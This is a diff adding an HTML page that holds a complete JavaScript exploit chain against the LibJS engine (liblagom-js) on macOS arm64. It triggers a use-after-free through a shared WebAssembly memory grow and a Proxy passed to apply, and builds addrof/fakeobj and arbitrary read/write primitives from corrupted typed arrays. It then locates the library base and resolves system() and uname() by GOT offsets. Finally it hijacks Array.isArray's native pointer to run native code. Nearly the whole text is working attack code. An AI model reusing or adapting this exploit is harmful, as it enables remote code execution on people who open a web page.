@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html><body><pre id="o"></pre><script>
+"use strict";
+const O = document.getElementById('o');
+let _log = "";
+function L(s){ _log += s + '\n'; console.log(s); }
+function FLUSH(){ O.textContent = _log; }
+function H(n){ return '0x' + n.toString(16); }
+
+const _cv = new ArrayBuffer(8);
+const _f64 = new Float64Array(_cv);
+const _u32 = new Uint32Array(_cv);
+function bitsToDouble(lo, hi){ _u32[0]=lo|0; _u32[1]=hi|0; return _f64[0]; }
+function lo32(b){ return Number(b & 0xFFFFFFFFn)|0; }
+function hi32(b){ return Number((b>>32n) & 0xFFFFFFFFn)|0; }
+
+// ---- Pre-allocate EVERYTHING before UAF ----
+let _slot = [null,null,null,null];
+let _leak_lo = [0,0,0,0], _leak_hi = [0,0,0,0];
+let _wlo = 0, _whi = 0, _do_write = false;
+let _capture = [0,0,0,0];
+let _abort = {abort:true};
+let _do_abort = true;
+function recv(){ _capture[0]=arguments[0]; _capture[1]=arguments[1]; _capture[2]=arguments[2]; _capture[3]=arguments[3]; }
+
+const proxy = new Proxy({}, {
+  get(t, k) {
+    if (k === 'length') return 16384;
+    let i = k|0;
+    if (i >= 1 && i <= 4) { _leak_lo[i-1] = viewA[(i-1)*2]; _leak_hi[i-1] = viewA[(i-1)*2+1]; }
+    if (i === 5 && _do_abort) throw _abort;
+    if (i === 1 && _do_write && viewA[1] !== 0x7FFA0000) { _do_write=false; throw _abort; } // Vector not at X
+    if (i === 16383 && _do_write) { viewA[0]=_wlo; viewA[1]=_whi; }
+    if (i < 4) return _slot[i];
+    return 0;
+  }
+});
+try { recv.apply(null, {length:0}); } catch(e){}
+
+// Spray adjacent {} pairs BEFORE UAF
+const NPAIRS = 4096;
+let pairs_h = []; pairs_h.length = NPAIRS; for (let i=0;i<NPAIRS;i++) pairs_h[i]=null;
+let pairs_n = []; pairs_n.length = NPAIRS; for (let i=0;i<NPAIRS;i++) pairs_n[i]=null;
+for (let i = 0; i < NPAIRS; i++) {
+  let h = {}; let n = {}; n.a = 1.1; n.b = 1.1;
+  pairs_h[i] = h; pairs_n[i] = n;
+}
+let rw1 = new Uint32Array(new ArrayBuffer(16));  // will point AT rw2's GC cell
+let rw2 = new Uint32Array(new ArrayBuffer(16));  // will be retargetable via rw1
+
+// Warm proxy path (this allocates a 128K Vector; do it BEFORE UAF so its slot != X)
+var viewA = new Uint32Array(1); // dummy so proxy.get doesn't crash
+try { recv.apply(null, proxy); } catch(e){}
+
+// Pre-size containers used by the retry loop so growing them never crosses 128K mid-attempt.
+var _pins = []; _pins.length = 64; _pins.length = 0;
+var _mems = []; _mems.length = 64; _mems.length = 0;
+var _attempt = 0;
+let holder=null, next_cell=null, Haddr=0n, R1=0n, R2=0n, V=0n, TF=0n;
+
+// ---- addrof / fakeobj (close over global viewA; safe outside the retry loop) ----
+function addrof_raw(o0,o1,o2,o3){
+  _slot[0]=o0;_slot[1]=o1;_slot[2]=o2;_slot[3]=o3;_do_abort=true;_do_write=false;
+  try { recv.apply(null, proxy); } catch(e){}
+}
+function addrof(o){ addrof_raw(o,0,0,0); return BigInt(_leak_lo[0]>>>0)|(BigInt(_leak_hi[0]&0xFFFF)<<32n); }
+
+function fakeobj(addr){
+  _slot[0]=0;_slot[1]=0;_slot[2]=0;_slot[3]=0;
+  _wlo=lo32(addr);_whi=(hi32(addr)|0xFFF90000)|0;_do_abort=false;_do_write=true;
+  for (let retry=0; retry<32; retry++) {
+    _do_write=true;
+    try { recv.apply(null, proxy); }
+    catch(e) {
+      // Vector didn't land at X. Pin whatever slot it DID get so the next
+      // apply has to pick a different free block.
+      _pins[_pins.length] = new ArrayBuffer(131072);
+      continue;
+    }
+    let f=_capture[0];_capture[0]=0;
+    if (f !== 0) return f;
+  }
+  return null;
+}
+
+retry: for (_attempt = 1; _attempt <= 20; _attempt++) {
+
+// ---- Trigger UAF ----
+let mem = new WebAssembly.Memory({initial: 1, maximum: 1000, shared: true});
+_mems[_mems.length] = mem;       // keep old mems alive across attempts
+viewA = new Uint32Array(mem.buffer);
+mem.grow(1);
+mem.grow(100);
+_pins.length = 0;                // release pins from previous attempt
+
+// Verify
+let test = pairs_h[0];
+let a1 = addrof(test), a2 = addrof(test);
+if (a1!==a2 || (_leak_hi[0]>>>16)!==0xFFF9) {
+  L("[attempt "+_attempt+"] addrof unstable: "+H(a1)+"/"+H(a2)+" tag="+H(_leak_hi[0]>>>16));
+  continue retry;
+}
+L("[attempt "+_attempt+"] addrof stable: " + H(a1));
+
+// Find suitable pair
+holder=null; next_cell=null; Haddr=0n;
+let dbg_adj=0;
+for (let i = 0; i < NPAIRS; i++) {
+  addrof_raw(pairs_h[i], pairs_n[i], 0, 0);
+  let H0 = BigInt(_leak_lo[0]>>>0)|(BigInt(_leak_hi[0]&0xFFFF)<<32n);
+  let N0 = BigInt(_leak_lo[1]>>>0)|(BigInt(_leak_hi[1]&0xFFFF)<<32n);
+  if (N0 - H0 !== 64n) continue;
+  dbg_adj++;
+  if ((((H0+48n) >> 19n) & 1n) === 0n) continue;
+  holder=pairs_h[i]; next_cell=pairs_n[i]; Haddr=H0; break;
+}
+if (!holder) { L("[attempt "+_attempt+"] no pair (adj="+dbg_adj+")"); continue retry; }
+L("holder@"+H(Haddr)+" next@"+H(Haddr+64n)+" fake@"+H(Haddr+16n)+" (adj="+dbg_adj+")");
+
+// Pre-compute target addresses (do EVERY addrof here, while X is freshly
+// reclaimed by each apply; stage 2 must not call addrof again because by then
+// X may have been purged and viewA[i] would fault).
+R1 = addrof(rw1); R2 = addrof(rw2);
+V = addrof(viewA);
+TF = addrof(Array.isArray);
+L("rw1@"+H(R1)+" rw2@"+H(R2)+" viewA@"+H(V)+" Array.isArray@"+H(TF));
+
+let R1lo=lo32(R1),R1hi=hi32(R1),R2lo=lo32(R2),R2hi=hi32(R2);
+function add48(lo,hi,off){let s=(lo>>>0)+off;return [s|0,(hi+(s>0xFFFFFFFF?1:0))|0];}
+
+// ---- Create fake & immediately corrupt rw1/rw2 (NO ALLOCS) ----
+let fake = fakeobj(Haddr+16n);
+if (fake === null) {
+  L("[attempt "+_attempt+"] fakeobj miss; viewA[0..3]="+H(viewA[0]>>>0)+","+H(viewA[1]>>>0)+","+H(viewA[2]>>>0)+","+H(viewA[3]>>>0));
+  continue retry;
+}
+_capture[0]=0;_capture[1]=0;_capture[2]=0;_capture[3]=0;
+
+function fw8(baselo,basehi,off,v){let a=add48(baselo,basehi,off);next_cell.b=bitsToDouble(a[0],a[1]);fake[0]=v|0;}
+// rw1: m_array_length=0x7FFFFFFF, m_data=addrof(rw2)
+fw8(R1lo,R1hi,68,0xFF);fw8(R1lo,R1hi,69,0xFF);fw8(R1lo,R1hi,70,0xFF);fw8(R1lo,R1hi,71,0x7F);
+fw8(R1lo,R1hi,104,(R2lo>>>0)&0xFF);fw8(R1lo,R1hi,105,(R2lo>>>8)&0xFF);fw8(R1lo,R1hi,106,(R2lo>>>16)&0xFF);fw8(R1lo,R1hi,107,(R2lo>>>24)&0xFF);
+fw8(R1lo,R1hi,108,(R2hi>>>0)&0xFF);fw8(R1lo,R1hi,109,(R2hi>>>8)&0xFF);fw8(R1lo,R1hi,110,0);fw8(R1lo,R1hi,111,0);
+// rw2: m_array_length=0x7FFFFFFF (m_data set later via rw1)
+fw8(R2lo,R2hi,68,0xFF);fw8(R2lo,R2hi,69,0xFF);fw8(R2lo,R2hi,70,0xFF);fw8(R2lo,R2hi,71,0x7F);
+
+fake=null;next_cell.b=0;
+break retry;
+} // retry loop
+
+if (_attempt > 20) { L("FAIL: gave up after 20 attempts"); FLUSH(); throw "stop"; }
+
+// ---- Stable retargetable arb R/W ----
+// rw1[i] accesses *(R2 + i*4). rw2's m_data is at R2+104, len at R2+68.
+function setTarget(addr){ rw1[26]=lo32(addr); rw1[27]=hi32(addr); }
+function r32(addr){ setTarget(addr); return rw2[0]>>>0; }
+function w32(addr,v){ setTarget(addr); rw2[0]=v|0; }
+function r64(addr){ return BigInt(r32(addr))|(BigInt(r32(addr+4n))<<32n); }
+function w64(addr,v){ w32(addr,lo32(v)); w32(addr+4n,hi32(v)); }
+function rstr(addr,n){ let s="";for(let i=0n;i<n;i++){let b=r32(addr+i)&0xFF;if(b===0)break;s+=String.fromCharCode(b);}return s; }
+function wstr(addr,s){ for(let i=0;i<s.length;i++) w32(addr+BigInt(i), s.charCodeAt(i)); w32(addr+BigInt(s.length),0); }
+
+let VT = r64(V);
+let X = r64(V+104n);
+L("viewA vtable = "+H(VT));
+L("viewA.m_data = "+H(X));
+
+window.r32=r32;window.w32=w32;window.r64=r64;window.w64=w64;
+window.VT=VT;window.V=V;window.TF=TF;window.Haddr=Haddr;window.R1=R1;window.R2=R2;window.rw1=rw1;window.rw2=rw2;
+window.L=L;window.H=H;window.FLUSH=FLUSH;window.lo32=lo32;window.hi32=hi32;
+
+L("\n>>> ARBITRARY R/W ACHIEVED <<<");
+</script>
+<script>
+"use strict";
+// ==== Stage 2: code exec (separate Executable to avoid bloating stage 1) ====
+(function stage2(){
+
+// Find Heap & VM
+let HB = Haddr & ~0x3FFFn;
+let heap_addr = r64(HB);
+L("HeapBlock@"+H(HB)+" -> Heap@"+H(heap_addr));
+
+// Find VM: m_heap ends at VM+15040 (followed by 2 Vectors then m_running_execution_context@15088).
+// So sizeof(Heap) + offsetof(m_heap) = 15040. Search candidate VM = heap_addr - K for K in [8..15040].
+// Validate: *(VM+15088) should be a pointer (high bytes look like mimalloc/stack region),
+//           *(VM+15040) should be small (Vector size, 0-10),
+//           *(VM+0) should be small u32 (ref_count, 1-10).
+let VM_addr = 0n;
+for (let K = 8n; K <= 15040n; K += 8n) {
+  let cand = heap_addr - K;
+  let rc = r32(cand);
+  if (rc < 1 || rc > 20) continue;
+  let vec_size = r64(cand + 15040n);
+  if (vec_size > 100n) continue;
+  let rec = r64(cand + 15088n);
+  // rec is ExecutionContext*, allocated near the GC heap region; reject anything
+  // outside that region before dereferencing it.
+  if ((rec >> 32n) !== (Haddr >> 32n)) continue;
+  let realm = r64(rec + 8n);
+  if ((realm >> 32n) !== (Haddr >> 32n)) continue;
+  VM_addr = cand;
+  L("VM @ " + H(VM_addr) + " (heap_off=" + K + ", refcount=" + rc + ", running_ec=" + H(rec) + ")");
+  break;
+}
+if (VM_addr === 0n) { L("VM not found"); throw "stop"; }
+
+// liblagom-js base. The Uint32Array vtable pointer (vtable+0x10) sits at a
+// fixed offset from the dylib base; recompute with:
+//   nm liblagom-js.dylib | c++filt | grep 'vtable for JS::Uint32Array'  -> +0x10
+let JS_BASE = VT - 0x426300n;
+L("liblagom-js base = " + H(JS_BASE));
+let mh = r32(JS_BASE);
+L("Mach-O magic = " + H(mh) + " (expect 0xfeedfacf)");
+if (mh !== 0xfeedfacf || (JS_BASE & 0xFFFn) !== 0n) {
+  L("FAIL: liblagom-js base wrong (rebuild changed the vtable offset)");
+  FLUSH(); throw "stop";
+}
+
+// getenv addr from GOT (dyld_info -fixups liblagom-js.dylib | grep _getenv)
+let getenv_addr = r64(JS_BASE + 0x3FCE68n);
+L("getenv = " + H(getenv_addr));
+// dyld shared cache deltas (macOS 25.4.0 arm64)
+let uname_addr = getenv_addr + 0x13148n;
+L("uname  = " + H(uname_addr) + "  insn[0]=" + H(r32(uname_addr)));
+let system_addr = getenv_addr + 0x75580n;
+L("system = " + H(system_addr) + "  insn[0]=" + H(r32(system_addr)));
+
+// Hijack target: Array.isArray (RawNativeFunction; address TF computed in stage 1)
+let target_fn = Array.isArray;
+let orig_native = r64(TF + 96n);
+L("Array.isArray @ " + H(TF) + "  m_native_function=" + H(orig_native));
+L("  flags = " + H(r32(TF+8n)>>>16 & 0xFF));
+
+// ==== CODE EXEC: uname(VM*) ====
+// Save VM[0..1279] (utsname is 5*256 = 1280 bytes)
+let vm_save = new Uint32Array(1280/4);
+for (let i = 0; i < 320; i++) vm_save[i] = r32(VM_addr + BigInt(i*4));
+
+// Hijack
+w64(TF + 96n, uname_addr);
+
+// Call: asm fast path -> call_try_native -> blr uname. x0=VM*, x1=0 on return.
+try { target_fn(0); } catch(e) { /* ignore */ }
+
+// Read utsname from VM (BEFORE restore, asm fast path only)
+let uts = new Uint32Array(1280/4);
+for (let i = 0; i < 320; i++) uts[i] = r32(VM_addr + BigInt(i*4));
+
+// Restore VM
+for (let i = 0; i < 320; i++) w32(VM_addr + BigInt(i*4), vm_save[i]);
+// Restore m_native_function
+w64(TF + 96n, orig_native);
+
+// Decode utsname strings
+function cstr(arr, off) {
+  let s = "";
+  for (let i = 0; i < 256; i++) {
+    let b = (arr[(off+i)>>2] >>> ((off+i)&3)*8) & 0xFF;
+    if (b === 0) break;
+    s += String.fromCharCode(b);
+  }
+  return s;
+}
+let sysname  = cstr(uts, 0);
+let nodename = cstr(uts, 256);
+let release  = cstr(uts, 512);
+let version  = cstr(uts, 768);
+let machine  = cstr(uts, 1024);
+
+L("");
+L("======== uname -a ========");
+L(sysname + " " + nodename + " " + release + " " + version + " " + machine);
+L("==========================");
+
+// Neutralize corrupted TypedArrays so GC/teardown doesn't crash.
+// viewA: m_data still points at freed mimalloc block X. Set m_data=0 (forces slow path) and len=0.
+w64(V+104n, 0n); w32(V+68n, 0);
+// rw2: set m_data=R2 (self), len=0.
+rw1[26]=lo32(R2); rw1[27]=hi32(R2); rw1[17]=0;
+// rw1: m_data=R2 (valid GC mem), len=huge. Harmless for GC. Leave it.
+
+})();
+FLUSH();
+</script></body></html>
